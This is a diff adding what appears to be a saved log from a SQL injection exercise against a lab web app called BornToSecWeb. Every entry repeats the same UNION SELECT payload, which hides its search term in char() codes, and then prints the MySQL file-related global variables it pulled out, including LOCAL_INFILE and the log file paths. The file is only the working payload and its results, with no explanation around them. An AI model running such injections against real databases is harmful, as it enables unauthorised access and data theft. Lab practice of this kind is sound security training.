@@ -1,0 +1,75 @@
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: SECURE_FILE_PRIV
+Surname : 
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: FT_STOPWORD_FILE
+Surname : (built-in)
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: LARGE_FILES_SUPPORT
+Surname : ON
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_LOG_FILE_SIZE
+Surname : 5242880
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INIT_FILE
+Surname : 
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: LOWER_CASE_FILE_SYSTEM
+Surname : OFF
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: KEEP_FILES_ON_CREATE
+Surname : OFF
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_FILE_FORMAT
+Surname : Antelope
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: CHARACTER_SET_FILESYSTEM
+Surname : binary
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_DATA_FILE_PATH
+Surname : ibdata1:10M:autoextend
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: PERFORMANCE_SCHEMA_MAX_FILE_CLASSES
+Surname : 50
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: GENERAL_LOG_FILE
+Surname : /var/lib/mysql/BornToSecWeb.log
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: RELAY_LOG_INFO_FILE
+Surname : relay-log.info
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: PID_FILE
+Surname : /var/run/mysqld/mysqld.pid
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_LOG_FILES_IN_GROUP
+Surname : 2
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_OPEN_FILES
+Surname : 300
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_FILE_FORMAT_CHECK
+Surname : ON
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: LOCAL_INFILE
+Surname : ON
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: PERFORMANCE_SCHEMA_MAX_FILE_HANDLES
+Surname : 32768
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: OPEN_FILES_LIMIT
+Surname : 1024
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: PERFORMANCE_SCHEMA_MAX_FILE_INSTANCES
+Surname : 10000
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_FILE_FORMAT_MAX
+Surname : Antelope
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: SLOW_QUERY_LOG_FILE
+Surname : /var/lib/mysql/BornToSecWeb-slow.log
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: INNODB_FILE_PER_TABLE
+Surname : OFF
+ID: -1 union select variable_name,variable_value from information_schema.global_variables where variable_name like char(37, 102, 105, 108, 101, 37) 
+First name: MYISAM_MAX_SORT_FILE_SIZE
+Surname : 2146435072
